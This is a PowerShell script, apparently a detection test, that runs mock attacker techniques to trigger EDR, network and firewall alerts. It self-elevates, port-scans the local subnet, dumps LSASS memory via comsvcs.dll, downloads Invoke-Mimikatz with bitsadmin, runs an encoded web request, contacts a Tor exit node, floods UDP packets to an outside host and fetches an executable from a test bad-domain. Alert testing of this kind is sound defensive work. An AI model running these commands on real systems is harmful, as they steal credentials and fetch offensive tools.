# Step one: Ensure we are running with elevated privileges
function Check-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (-not (Check-Admin)) {
    Write-Host "Elevating privileges..." -ForegroundColor Yellow
    Start-Process pwsh.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Function to select network range with timeout
function Select-NetworkRange {
    Write-Host "Choose network range to scan:" -ForegroundColor Green
    Write-Host "1) Use the network defined by the NIC"
    Write-Host "2) Enter a custom RFC1918 network range (e.g., 192.168.1.0/24)"
    
    $netChoice = $null
    $timer = [Diagnostics.Stopwatch]::StartNew()
    while ($timer.Elapsed.TotalSeconds -lt 10 -and -not $netChoice) {
        if ([Console]::KeyAvailable) {
            $netChoice = Read-Host "Enter your choice (1-2) [Default: 1]"
        }
    }
    if (-not $netChoice) { $netChoice = "1" }
    
    if ($netChoice -eq "1") {
        return $null  # Use default NIC network
    } else {
        while ($true) {
            $customRange = Read-Host "Enter an RFC1918 network range (e.g., 192.168.1.0/24)"
            if ($customRange -match "^(10\.\d+\.\d+\.\d+/\d+|172\.(1[6-9]|2[0-9]|3[01])\.\d+\.\d+/\d+|192\.168\.\d+\.\d+/\d+)$") {
                return $customRange
            } else {
                Write-Host "Invalid RFC1918 address range. Please enter a valid private network." -ForegroundColor Red
            }
        }
    }
}


# Define function to scan network
function Start-NetworkScan {
    param([string[]]$IPs)
    
    if ($IPs.Count -eq 0) {
        Write-Host "Skipping network scan due to missing IPs." -ForegroundColor Yellow
        return
    }
    
    $ports = @(21, 22, 23, 25, 80, 110, 443, 8000, 8008, 8888, 9000, 9009, 1337, 3398, 5800, 5900, 445, 1433)
    
    foreach ($ip in $IPs) {
        foreach ($port in $ports) {
            Write-Host "Scanning $ip on port $port..." -ForegroundColor Cyan
            Try {
                $socket = New-Object System.Net.Sockets.TcpClient
                $socket.SendTimeout = 500
                $socket.Connect($ip.Trim(), $port)
                if ($socket.Connected) {
                    Write-Host "$ip`:$port - TCP Port Open" -ForegroundColor Green
                }
                $socket.Close()
            } Catch {
                Write-Host "$ip`:$port - TCP Port Closed or Unreachable" -ForegroundColor Red
            }
        }
    }
}

# Function to get active IPs based on selection
function Get-ActiveIPs {
    $networkRange = Select-NetworkRange
    
    if (-not $networkRange) {
        $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0").NextHop
        $nic = Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq (Get-NetRoute | Where-Object { $_.NextHop -eq $gateway }).InterfaceIndex -and $_.AddressFamily -eq 'IPv4' }
        
        if (-not $nic) {
            Write-Host "Error: Could not determine network interface. Continuing..." -ForegroundColor Yellow
            return @()
        }
        
        $ipParts = $nic.IPAddress -split '\.'
        if ($ipParts.Count -ne 4) {
            Write-Host "Error: Invalid IPv4 address format. Continuing..." -ForegroundColor Yellow
            return @()
        }
        
        $excludedLastOctet = [int]$ipParts[3]
        $ipRange = 2..254 | Where-Object { $_ -ne $excludedLastOctet }
    } else {
        $ipParts = $networkRange -split '\.'
        $ipRange = 1..254
    }
    
    Write-Host "Pinging selected subnet sequentially to find active hosts and scanning immediately..." -ForegroundColor Cyan
    $activeIPs = @()
    
    foreach ($i in $ipRange) {
        $ip = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2]).$i"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
            $activeIPs += $ip
            Start-NetworkScan -IPs @($ip) # Run scan immediately for each active host
        }
        if ($activeIPs.Count -ge 20) { break }
    }
    
    Write-Host "Active hosts found: $($activeIPs -join ', ')" -ForegroundColor Green
    return $activeIPs
}

# Function to perform EDR alert simulation
function Trigger-EDR {
    Write-Host "Triggering EDR alert..." -ForegroundColor Green
    $allFailed = $true  # Track if all TTPs fail
    $successList = @()
    $failList = @()
    
    Try {
        Write-Host "Simulating T1003.001 - LSASS Memory Dump" -ForegroundColor Green
        rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
        Write-Host "T1003.001 executed successfully." -ForegroundColor Green
        
        $successList += "T1003.001"
        $allFailed = $false
    } Catch {
        Write-Host "T1003.001 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1003.001"
    }
    
    Try {
        Write-Host "Simulating T1059.001 - PowerShell Download of Mimikatz" -ForegroundColor Green
        Start-Process -FilePath "bitsadmin" -WindowStyle Hidden -ArgumentList "/transfer Mimi https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1 $env:TEMP\Invoke-Mimikatz.ps1" -ErrorAction Stop
        Write-Host "T1059.001 executed successfully." -ForegroundColor Green
        $successList += "T1059.001"
        $allFailed = $false
    } Catch {
        Write-Host "T1059.001 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1059.001"
    }
    
    if ($allFailed) {
        Write-Host "All EDR simulation steps failed!" -ForegroundColor Red
    } else {
        Write-Host "EDR simulation complete." -ForegroundColor Green
    }
    
    Write-Host "Summary of execution:" -ForegroundColor Cyan
    Write-Host "Successful TTPs: $($successList -join ', ')" -ForegroundColor Green
    Write-Host "Failed TTPs: $($failList -join ', ')" -ForegroundColor Yellow
}

# Function to perform NVM alert simulation
function Trigger-NVM {
    Write-Host "Triggering NVM alert..." -ForegroundColor Green
    $allFailed = $true  # Track if all TTPs fail
    $successList = @()
    $failList = @()
    
    Try {
        Write-Host "Simulating T1027.010 - Obfuscation (Base64 Encoding)" -ForegroundColor Green
        $validUrl = "https://docs.google.com/spreadsheets/d/1LT2c4JsniM7iIZoFKSQyVpT-hWwfl6MfW2746USfhDw/edit?usp=sharing"
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Invoke-WebRequest -Uri '$validUrl' -UseBasicParsing"))
        $process = Start-Process -FilePath "powershell" -ArgumentList "-EncodedCommand $encodedCommand" -NoNewWindow -PassThru -ErrorAction SilentlyContinue
        if ($process) {
            Write-Host "T1027.010 executed successfully." -ForegroundColor Green
            $successList += "T1027.010"
            $allFailed = $false
        } else {
            Write-Host "T1027.010 encountered an error. Continuing..." -ForegroundColor Yellow
            $failList += "T1027.010"
        }
    } Catch {
        Write-Host "T1027.010 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1027.010"
    }
    
    Try {
        Write-Host "Simulating T1059.001 - Connection to Raw Public IP" -ForegroundColor Green
        $resolvedIP = [System.Net.Dns]::GetHostAddresses("ihatemikesimone.com") | Select-Object -First 1
        if ($resolvedIP) {
            Try {
                $response = Invoke-WebRequest -Uri "http://$resolvedIP" -UseBasicParsing -ErrorAction Stop
                if ($response.StatusCode -eq 200 -or $response.StatusCode -eq 403) {
                    Write-Host "T1059.001 successful." -ForegroundColor Green
                    $successList += "T1059.001"
                    $allFailed = $false
                } else {
                    Write-Host "T1059.001 received unexpected response: $($response.StatusCode). Continuing..." -ForegroundColor Yellow
                    $failList += "T1059.001"
                }
            } Catch {
                Write-Host "T1059.001 encountered an HTTP error. Continuing..." -ForegroundColor Yellow
                $failList += "T1059.001"
            }
        } else {
            Write-Host "T1059.001 failed: Could not resolve IP. Continuing..." -ForegroundColor Yellow
            $failList += "T1059.001"
        }
    } Catch {
        Write-Host "T1059.001 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1059.001"
    }
    
    Try {
        Write-Host "Simulating T1090.003 - Multi-hop Proxy via TOR Exit Node" -ForegroundColor Green
        $torExitNode = "95.216.209.28"
        Test-NetConnection -ComputerName $torExitNode -Port 443 -ErrorAction SilentlyContinue
        $allFailed = $false
        $successList += "T1090.003"
    } Catch {
        Write-Host "T1090.003 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1090.003"
    }
    
    Try {
        Write-Host "Simulating T1105 - Abuse of DNSAPI.DLL for network request" -ForegroundColor Green
        $dnsApi = Add-Type -MemberDefinition '[DllImport("dnsapi.dll", SetLastError=true)]
        public static extern int DnsQuery_A(string name, int type, int options, int zero, ref int ptr, int reserved);' -Name 'DNSQuery' -Namespace 'Win32' -PassThru
        $ptr = 0
        $dnsApi::DnsQuery_A("ihatemikesimone.com", 1, 0, 0, [ref]$ptr, 0)
        $allFailed = $false
        $successList += "T1105"
    } Catch {
        Write-Host "T1105 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1105"
    }
    
    if ($allFailed) {
        Write-Host "All NVM simulation steps failed!" -ForegroundColor Red
    } else {
        Write-Host "NVM simulation complete." -ForegroundColor Green
    }
    
    Write-Host "Summary of execution:" -ForegroundColor Cyan
    Write-Host "Successful TTPs: $($successList -join ', ')" -ForegroundColor Green
    Write-Host "Failed TTPs: $($failList -join ', ')" -ForegroundColor Yellow
}

# Function to perform NDR alert simulation
function Trigger-NDR {
    Write-Host "Triggering NDR alert..." -ForegroundColor Green
    $allFailed = $true
    $successList = @()
    $failList = @()
    
    Try {
        Write-Host "Simulating T1041 - Exfiltration Over C2 Channel" -ForegroundColor Green
        1..9999 | ForEach-Object {
            $udpClient = New-Object System.Net.Sockets.UdpClient('75.75.75.75', 53)
            $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200)
            $udpClient.Send($data, $data.Length) | Out-Null
            Start-Sleep -Milliseconds 25
        }
        Write-Host "T1041 executed successfully." -ForegroundColor Green
        $successList += "T1041"
        $allFailed = $false
    } Catch {
        Write-Host "T1041 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1041"
    }
    
    Try {
        Write-Host "Simulating T1105 - Ingress Tool Transfer" -ForegroundColor Green
        Invoke-WebRequest -Uri 'http://internetbadguys.com/wget.exe' -OutFile "$env:TEMP\wget.exe"
        Write-Host "T1105 executed successfully." -ForegroundColor Green
        $successList += "T1105"
        $allFailed = $false
    } Catch {
        Write-Host "T1105 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1105"
    }
    
    if ($allFailed) {
        Write-Host "All NDR simulation steps failed!" -ForegroundColor Red
    } else {
        Write-Host "NDR simulation complete." -ForegroundColor Green
    }
    
    Write-Host "Summary of execution:" -ForegroundColor Cyan
    Write-Host "Successful TTPs: $($successList -join ', ')" -ForegroundColor Green
    Write-Host "Failed TTPs: $($failList -join ', ')" -ForegroundColor Yellow
}

# Function to perform Firewall alert simulation
function Trigger-Firewall {
    Write-Host "Triggering Firewall alert..." -ForegroundColor Green
    $allFailed = $true
    $successList = @()
    $failList = @()
    
    Try {
        Write-Host "Simulating T1090 - Connection Proxy" -ForegroundColor Green
        $randomIP = "$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255)"
        Invoke-WebRequest -Uri "http://$randomIP/sqlite3.pdf.vbs" -ErrorAction Stop
        Write-Host "T1090 executed successfully." -ForegroundColor Green
        $successList += "T1090"
        $allFailed = $false
    } Catch {
        Write-Host "T1090 failed. Continuing..." -ForegroundColor Yellow
        $failList += "T1090"
    }
    
    if ($allFailed) {
        Write-Host "All Firewall simulation steps failed!" -ForegroundColor Red
    } else {
        Write-Host "Firewall simulation complete." -ForegroundColor Green
    }
    
    Write-Host "Summary of execution:" -ForegroundColor Cyan
    Write-Host "Successful TTPs: $($successList -join ', ')" -ForegroundColor Green
    Write-Host "Failed TTPs: $($failList -join ', ')" -ForegroundColor Yellow
}


# Main menu with timeout
Write-Host "Choose an option:" -ForegroundColor Green
Write-Host "1) EDR trigger"
Write-Host "2) NVM trigger"
Write-Host "3) NDR trigger"
Write-Host "4) Firewall trigger"
Write-Host "5) ALL TRIGGERS"

# Initialize log file
$logFile = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads", "XDR_Trigger_Log.txt")
New-Item -Path $logFile -ItemType File -Force | Out-Null


$choice = $null
$timer = [Diagnostics.Stopwatch]::StartNew()
while ($timer.Elapsed.TotalSeconds -lt 10 -and -not $choice) {
    if ([Console]::KeyAvailable) {
        $choice = Read-Host "Enter your choice (1-5) [Default: 5]"
    }
}
if (-not $choice) { $choice = "5" }

switch ($choice) {
    "1" { Trigger-EDR }
    "2" { Trigger-NVM }
    "3" { Trigger-NDR }
    "4" { Trigger-Firewall }
    "5" {
        Trigger-EDR
        Trigger-NVM
        Trigger-NDR
        Trigger-Firewall
    }
    default {
        Write-Host "Invalid choice. Exiting." -ForegroundColor Red
    }
}

Write-Host "Scan and trigger execution complete." -ForegroundColor Green
